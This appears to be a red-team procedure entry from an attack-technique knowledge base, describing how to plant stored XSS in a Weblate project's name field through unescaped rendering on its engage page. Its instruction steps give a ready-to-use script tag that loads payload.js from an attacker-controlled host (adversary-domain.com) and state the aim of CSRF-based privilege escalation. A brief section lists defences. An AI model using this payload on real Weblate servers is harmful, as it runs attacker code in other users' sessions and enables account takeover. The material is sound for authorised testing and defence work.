---
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools:
  - '[[tools/payload-js]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:16:20.256Z'
sub_techniques: []
id: e7f233e3-4293-4fda-9948-de413a448ca3
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-XSS-Payload-into-Weblate-Project-Name

## Summary

This procedure injects a stored XSS payload into Weblate's project name field, exploiting improper escaping to enable script execution when the project is viewed on the engage page.

## Description

In Weblate, the project name is stored and rendered without proper HTML escaping on the `/engage/<project_slug>` page due to manual string formatting in `weblate/trans/views/basic.py`. An attacker with project edit access can inject a script tag loading an external JavaScript file, which executes in the context of the authenticated user viewing the page. This is limited to 60 characters, so external loading is used to deliver a full payload for further exploitation like CSRF-based privilege escalation.

## Requirements

1. Authenticated access to Weblate as a project maintainer or admin
2. Control over an external domain to host the payload.js file
3. Knowledge of the target project's slug for later triggering

## Defense

Defensive measures and detection strategies:

- Enable strict CSP to block external script loads
- Implement input sanitization and output escaping using Django's template system
- Monitor project name changes for suspicious content like script tags

## Objectives

1. Persist malicious JavaScript in the project name
2. Bypass character limits via external resource loading
3. Set up for execution on vulnerable endpoints

## Instructions

### Step 1: Prepare External Payload

**Context**: Host a JavaScript file on a controlled domain to contain the escalation logic, as the payload must fit within 60 characters.

Upload `payload.js` to `http://adversary-domain.com/payload.js` with content for later steps (e.g., fetch requests).

### Step 2: Inject Payload into Project Name

**Context**: Access the project creation or edit interface and set the name to the compact XSS payload.

In the Weblate admin or project settings, set the project name to:

```html
<script src="http://adversary-domain.com/payload.js"></script>
```

Save the project. The slug will be auto-generated or set based on the name.

> This injects the script without triggering immediate execution; it persists in the database.

**Expected Output**: Project updated successfully; name visible in listings but unescaped on render.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/payload-js]]

## Tags

- [[xss]]
- [[stored-xss]]
